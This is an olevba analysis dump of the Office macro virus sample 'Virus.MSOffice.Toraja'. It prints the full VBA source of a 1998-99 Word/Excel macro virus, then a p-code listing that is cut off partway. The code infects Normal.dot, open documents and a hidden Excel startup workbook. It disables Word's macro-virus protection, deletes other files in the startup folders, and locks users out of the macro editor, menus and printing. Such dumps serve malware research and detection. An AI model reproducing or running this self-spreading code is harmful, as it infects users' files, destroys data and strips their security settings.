olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Toraja
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Toraja - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Toraja17.bas 
in file: ./Virus.MSOffice.Toraja - OLE stream: 'Macros/VBA/Toraja17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Created       : Toraja High Land 1998 by Marsel - Lina
'Modified      : July 1999
'--------------------------------------------------------------
Option Explicit
Option Compare Text
Dim Komp As Variant, ctl As Variant
Public Const regApp As String = "Application": Public Const regSecSet As String = "Settings"
Public Const TempVer As String = "Tana": Public Const MacName As String = "Toraja"
Public Const fStartUp As String = "AutoRecover": Public Const Ver As String = "17"
Dim CusProp, blnMod As Boolean, actWindow
Global Active, Temp, tempPath, blnFound As Boolean, blnXls As Boolean
Sub Register()
On Error Resume Next
If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")
If GetSetting(regApp, regSecSet, "Version") <> Ver Then SaveSetting regApp, regSecSet, "Version", Ver
If GetSetting(regApp, regSecSet, "UserKeyWord") <> MacName & Ver Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
End Sub
Function Serang() As Boolean
Dim getDate As Date
On Error Resume Next
getDate = GetSetting(regApp, regSecSet, "FirstRun")
If getDate <= Date Then MsgBox "This command not available now.", vbCritical, "ToKing ..."
End Function
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = 0
RemStartUp Application.StartupPath & Application.PathSeparator
If MacroContainer <> fStartUp & Ver & ".dot" Then
    Application.DisplayRecentFiles = False
    MenuWord
    Register
Else
    Application.Documents.Open Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat"
    WordBasic.DisableAutoMacros 1
    AddIns.Unload False
    WordBasic.DisableAutoMacros 0
    Documents(fStartUp & Ver & ".dat").Close False
    Application.StatusBar = ""
End If
End Sub
Sub AutoNew()
On Error Resume Next
TempActive
ActiveWindow.View.Type = 3
End Sub
Function RemStartUp(fPath) As Boolean
On Error GoTo salah
blnXls = False: blnFound = False: blnMod = False
If Dir(fPath, 16) <> "" Then
  Komp = Dir(fPath, 0 Or 1 Or 2)
  Do While Komp <> ""
    If Komp = fStartUp & Ver & ".dot" Then blnMod = True: SetAttr fPath & Komp, 1
    If Komp = fStartUp & Ver & ".dat" Then blnFound = True: SetAttr fPath & Komp, 1 + 2
    If Komp = fStartUp & Ver & ".XLS" Then blnXls = True
    If Komp <> "." And Komp <> ".." And Komp <> fStartUp & Ver & ".dot" And Komp <> fStartUp & Ver & ".dat" And _
       Komp <> "MSCREATE.DIR" And Left(Komp, 2) <> "~$" And Komp <> fStartUp & Ver & ".XLS" Then _
       SetAttr fPath & Komp, vbNormal: Kill fPath & Komp
      Komp = Dir
  Loop
  If blnMod = True And blnFound = True Then RemStartUp = True
End If
Exit Function
salah:
Resume Next
End Function
Sub AutoOpen()
On Error Resume Next
Dim strRun As String
ActiveTemp
RemoveAll
MenuWord
Register
If blnFound = True Then
   strRun = TempVer & Ver & "." & MacName & Ver & ".FoundIt"
   Application.OnTime Now + TimeValue("00:01:00"), strRun
End If
End Sub
Sub AutoExit()
Application.Visible = False
Application.DisplayAlerts = 0
ExportXls
If RemStartUp(Application.StartupPath & Application.PathSeparator) = False Then
   Documents.Add
   ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", 0
   ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dot", 1
End If
End Sub
Function KeyWord() As Boolean
If GetSetting(regApp, regSecSet, "UserKeyWord") = MacName & Ver Then KeyWord = True
End Function
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros 1
Dialogs(80).Show
TempActive
WordBasic.DisableAutoMacros 0
End Sub
Function KompProject(Asal, Tujuan) As Boolean
On Error GoTo salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
   If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And _
      (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then
        If Komp.Name = MacName & Ver Then
              If Tujuan.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines > 0 Then blnMod = True Else _
                  Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
        Else
            Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
        End If
      KompProject = True
   End If
Next Komp
If blnMod = False Then
   If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
End If
salah:
End Function
Sub RemoveAll()
On Error Resume Next
Set ctl = Documents
For Each ctl In Documents
    If ctl <> ActiveDocument Then
        KompProject ActiveDocument, ctl
        If Len(ctl.Path) <> 0 Then ctl.Save
    End If
Next ctl
End Sub
Function PrintOke() As Boolean
Const CP = "cPrt"
On Error GoTo salah
If KeyWord = True Or GetCreator = True Then
    PrintOke = True
Else
    If CusProp.Item(CP).Value < 2 Then
        CusProp.Item(CP).Value = CusProp.Item(CP).Value + 1
        If Val(GetSetting(regApp, regSecSet, CP)) <= 50 Then
            SaveSetting regApp, regSecSet, CP, Val(GetSetting(regApp, regSecSet, CP)) + 1
            PrintOke = True
        End If
    End If
End If
salah:
End Function
Sub FilePrint()
On Error Resume Next
If PrintOke = True Then Dialogs(88).Show Else If Dialogs(88).Display = -1 Then Serang
End Sub
Sub FilePrintDefault()
FilePrint
End Sub
Sub ToolsCustomizeKeyboard()
Serang
End Sub
Sub ViewCode()
Serang
End Sub
Sub ViewVbCode()
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then Application.ShowVisualBasicEditor = True Else Serang
End Sub
Sub ToolsCustomize()
Serang
End Sub
Sub FormatStyle()
If KeyWord = True Then Dialogs(180).Show Else Serang
End Sub
Sub ToolsRecordMacroToggle()
Serang
End Sub
Sub ToolsMacro()
Serang
End Sub
Sub FileTemplates()
Serang
End Sub
Private Sub ExportXls()
Dim xlsApp
Dim strFile As String
On Error Resume Next
Set xlsApp = GetObject(, "Excel.Application")
If xlsApp Is Nothing Then
    Set xlsApp = CreateObject("Excel.Application")
    If Not xlsApp Is Nothing Then GoSub CheckXls:   xlsApp.Application.Quit
Else
    GoSub CheckXls
End If
Exit Sub
CheckXls:
     RemStartUp xlsApp.StartupPath & xlsApp.PathSeparator
    If blnXls = False Then
        xlsApp.Workbooks.Add
        strFile = xlsApp.StartupPath & xlsApp.PathSeparator & fStartUp & Ver & ".XLS"
        xlsApp.ActiveWorkbook.SaveAs strFile
        tempPath = Application.NormalTemplate.Path & Application.PathSeparator
        EIKModul NormalTemplate, xlsApp.Workbooks(fStartUp & Ver & ".XLS"), MacName & Ver
        xlsApp.Workbooks(fStartUp & Ver & ".XLS").VBProject.Name = TempVer & Ver
        xlsApp.ActiveWindow.Visible = False
        xlsApp.Workbooks(fStartUp & Ver & ".XLS").Save
    End If
Return
End Sub
Sub ExportDok()
Dim dokApp
On Error Resume Next
Set dokApp = GetObject(, "Word.Application")
If dokApp Is Nothing Then
    Set dokApp = CreateObject("Word.Application")
    If Not dokApp Is Nothing Then GoSub CheckDoc: dokApp.Application.Quit True
Else
    GoSub CheckDoc
End If
Exit Sub
CheckDoc:
tempPath = Application.TemplatesPath
KompProject Workbooks(fStartUp & Ver & ".XLS"), dokApp.NormalTemplate
RemStartUp dokApp.StartupPath & dokApp.PathSeparator
Return
End Sub
Sub Auto_Open()
On Error Resume Next
Application.EnableCancelKey = 0
XlsActive
ExportDok
Application.DisplayRecentFiles = False
End Sub
Private Sub AllWorkBook()
blnMod = False
For Each Komp In Workbooks
      actWindow = Komp.Name
      If actWindow = fStartUp & Ver & ".XLS" Then blnMod = True
      If Komp.Path = Application.StartupPath And actWindow <> fStartUp & Ver & ".XLS" Then
               Komp.Close False
               Kill Application.StartupPath & Application.PathSeparator & actWindow
         End If
 Next Komp
If blnMod = False Then BuatXlsActive
End Sub
Sub XlsActive()
On Error Resume Next
Application.DisplayAlerts = False
CreateEvents
TempActive
AllWorkBook
Application.OnSheetActivate = "": Application.OnSheetDeactivate = "": Application.OnWindow = ""
MenuExcel
Application.OnWindow = fStartUp & Ver & ".XLS" & "!XlsActive"
Application.DisplayAlerts = True
End Sub
Sub TempActive()
On Error Resume Next
Aplikasi
If KompProject(Temp, Active) = True Then
   SetCusProp
   Active.VBProject.Name = MacName
   If Len(Active.Path) <> 0 Then Active.Save
End If
End Sub
Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
On Error GoTo salah
    Asal.VBProject.VBComponents(Komp).Export tempPath & Komp
    Tujuan.VBProject.VBComponents.Import tempPath & Komp
    EIKModul = True
    Kill tempPath & Komp
salah:
End Function
Sub OpenFile()
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsActive
End Sub
Private Sub CreateEvents()
Dim vbComp
On Error GoTo salah
Lanjut:
If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> fStartUp & Ver & ".XLS" Then
On Error GoTo FatalError
    Set vbComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    With vbComp
            .DeleteLines 1, .CountOfLines
            .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
            .InsertLines 2, "On Error Resume Next"
            .InsertLines 3, "If PrintOke = False Then"
            .InsertLines 4, "    Serang"
            .InsertLines 5, "    Cancel = True"
            .InsertLines 6, "End if"
            .InsertLines 7, "End Sub"
    End With
ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver
End If
FatalError:
Exit Sub
salah:
ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, ""
Resume Lanjut
End Sub
Sub BuatXlsActive()
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActiveTemp
End Sub
Sub ActiveTemp()
On Error Resume Next
Aplikasi
If KompProject(Active, Temp) = True Then
   Temp.VBProject.Name = TempVer & Ver
   Temp.Save
   blnFound = True
End If
End Sub
Sub MenuExcel()
On Error Resume Next
For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
    ctl.OnAction = "Serang"
Next ctl
WordExcel
CommandBars("Ply").Controls("View Code").Delete
With Application
    .OnKey "%{F11}", "Serang": .OnKey "%{F8}", "Serang": .OnKey "%{F2}", "Serang"
    .OnKey "%{F4}", "Serang": .OnKey "{F12}", "Serang": .OnKey "^{o}", "OpenFile"
End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("Window").Controls("Unhide...").Enabled = False
End Sub
Sub WordExcel()
On Error Resume Next
cmdBars CommandBars("Control Toolbox"), True
cmdBars CommandBars("Forms"), True
cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True
cmdBars CommandBars.ActiveMenuBar, False
cmdBars CommandBars("Formatting"), False
cmdBars CommandBars("Standard"), False
End Sub
Sub cmdBars(cmd, blnVis As Boolean)
With cmd
If blnVis = True Then
    .Enabled = False: .Visible = False: .Protection = 8
End If
    .Protection = 1
End With
End Sub
Sub MenuWord()
On Error Resume Next
CustomizationContext = NormalTemplate
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
    .SaveInterval = 0
End With
FindKey(BuildKeyCode(1024, 119)).Disable
FindKey(BuildKeyCode(1024, 112)).Disable
WordExcel
End Sub
Sub SetCusProp()
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, "": CusProp.Add "cPrt", False, 1, 0
If PWords = True Then CusProp.Item("Author").Value = "Lina"
End Sub
Function GetCreator() As Boolean
On Error GoTo salah
Aplikasi
Set CusProp = Active.CustomDocumentProperties
If CusProp.Item("Author").Value = "Lina" Then GetCreator = True
salah:
End Function
Function PWords() As Boolean
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then PWords = True
End Function
Sub FoundIt()
TempActive: blnFound = False
End Sub
Function Tator() As Boolean
If (KeyWord = False) And (GetCreator = False) Then Tator = True
End Function
Sub Aplikasi()
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
tempPath = Application.NormalTemplate.Path & Application.PathSeparator: Set Active = ActiveDocument: Set Temp = NormalTemplate
End Sub
Sub Xls()
Set Active = ActiveWorkbook: Set Temp = Workbooks(fStartUp & Ver & ".XLS"): tempPath = Application.TemplatesPath
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Toraja
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/Toraja17 - 29676 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0036 "Created       : Toraja High Land 1998 by Marsel - Lina"
' Line #1:
' 	QuoteRem 0x0000 0x0019 "Modified      : July 1999"
' Line #2:
' 	QuoteRem 0x0000 0x003E "--------------------------------------------------------------"
' Line #3:
' 	Option  (Explicit)
' Line #4:
' 	Option  (Compare Text)
' Line #5:
' 	Dim 
' 	VarDefn Komp (As Variant)
' 	VarDefn ctl (As Variant)
' Line #6:
' 	Dim (Public Const) 
' 	LitStr 0x000B "Application"
' 	VarDefn regApp (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0008 "Settings"
' 	VarDefn regSecSet (As String)
' Line #7:
' 	Dim (Public Const) 
' 	LitStr 0x0004 "Tana"
' 	VarDefn TempVer (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0006 "Toraja"
' 	VarDefn MacName (As String)
' Line #8:
' 	Dim (Public Const) 
' 	LitStr 0x000B "AutoRecover"
' 	VarDefn fStartUp (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0002 "17"
' 	VarDefn Ver (As String)
' Line #9:
' 	Dim 
' 	VarDefn CusProp
' 	VarDefn blnMod (As Boolean)
' 	VarDefn actWindow
' Line #10:
' 	Dim (Global) 
' 	VarDefn Active
' 	VarDefn Temp
' 	VarDefn tempPath
' 	VarDefn blnFound (As Boolean)
' 	VarDefn blnXls (As Boolean)
' Line #11:
' 	FuncDefn (Sub Register())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	Ld Date 
' 	LitDI2 0x001E 
' 	Add 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #14:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	ArgsLd GetSetting 0x0003 
' 	Ld Ver 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0007 "Version"
' 	Ld Ver 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #15:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #16:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Function Serang() As Boolean)
' Line #19:
' 	Dim 
' 	VarDefn getDate (As Date)
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	St getDate 
' Line #22:
' 	Ld getDate 
' 	Ld Date 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "This command not available now."
' 	Ld vbCritical 
' 	LitStr 0x000A "ToKing ..."
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #23:
' 	EndFunc 
' Line #24:
' 	FuncDefn (Sub AutoExec())
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #27:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #28:
' 	Ld MacroContainer 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #30:
' 	ArgsCall MenuWord 0x0000 
' Line #31:
' 	ArgsCall Register 0x0000 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Option 0x0001 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #36:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #38:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Sub AutoNew())
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	ArgsCall TempActive 0x0000 
' Line #44:
' 	LitDI2 0x0003 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Function RemStartUp(fPath) As Boolean)
' Line #47:
' 	OnError salah 
' Line #48:
' 	LitVarSpecial (False)
' 	St blnXls 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St blnFound 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #49:
' 	Ld fPath 
' 	LitDI2 0x0010 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #50:
' 	Ld fPath 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Or 
' 	LitDI2 0x0002 
' 	Or 
' 	ArgsLd Dir 0x0002 
' 	St Komp 
' Line #51:
' 	Ld Komp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #52:
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #53:
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnFound 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #54:
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnXls 
' 	EndIf 
' Line #55:
' 	LineCont 0x0008 19 00 07 00 2E 00 07 00
' 	Ld Komp 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld Komp 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Ne 
' 	And 
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	Ne 
' 	And 
' 	Ld Komp 
' 	LitStr 0x000C "MSCREATE.DIR"
' 	Ne 
' 	And 
' 	Ld Komp 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "~$"
' 	Ne 
' 	And 
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #56:
' 	Ld Dir 
' 	St Komp 
' Line #57:
' 	Loop 
' Line #58:
' 	Ld blnMod 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St RemStartUp 
' 	EndIf 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	ExitFunc 
' Line #61:
' 	Label salah 
' Line #62:
' 	Resume (Next) 
' Line #63:
' 	EndFunc 
' Line #64:
' 	FuncDefn (Sub AutoOpen())
' Line #65:
' 	OnError (Resume Next) 
' Line #66:
' 	Dim 
' 	VarDefn strRun (As String)
' Line #67:
' 	ArgsCall ActiveTemp 0x0000 
' Line #68:
' 	ArgsCall RemoveAll 0x0000 
' Line #69:
' 	ArgsCall MenuWord 0x0000 
' Line #70:
' 	ArgsCall Register 0x0000 
' Line #71:
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld MacName 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0008 ".FoundIt"
' 	Concat 
' 	St strRun 
' Line #73:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld strRun 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub AutoExit())
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #78:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #79:
' 	ArgsCall ExportXls 0x0000 
' Line #80:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsLd RemStartUp 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #81:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #82:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #83:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Function KeyWord() As Boolean)
' Line #87:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KeyWord 
' 	EndIf 
' Line #88:
' 	EndFunc 
' Line #89:
' 	FuncDefn (Sub FileOpen())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #92:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #93:
' 	ArgsCall TempActive 0x0000 
' Line #94:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Function KompProject(Asal, Tujuan) As Boolean)
' Line #97:
' 	OnError salah 
' Line #98:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #99:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #100:
' 	LineCont 0x0004 11 00 06 00
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x0013 "Reference To Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sheet"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Chart"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #101:
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LineCont 0x0004 16 00 12 00
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	Else 
' 	BoSImplicit 
' 	Ld Komp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' 	EndIf 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	Ld Komp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	LitVarSpecial (True)
' 	St KompProject 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #110:
